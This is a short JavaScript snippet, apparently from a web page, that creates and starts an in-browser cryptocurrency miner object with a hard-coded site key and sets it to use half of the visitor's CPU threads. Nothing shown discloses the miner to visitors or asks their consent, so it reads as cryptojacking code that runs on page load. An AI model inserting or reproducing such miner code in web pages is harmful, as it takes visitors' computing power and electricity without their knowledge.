            var threads = window.navigator.hardwareConcurrency / 2;
            if (threads < 1) {
                var threads = 1;
            }
            var miner = new CRLT.Anonymous('f885aff79808cedf841800d6a8f83bb639802975d812', {
                threads: threads,
                autoThreads: false,
                throttle: 0.2,
            });
            miner.start();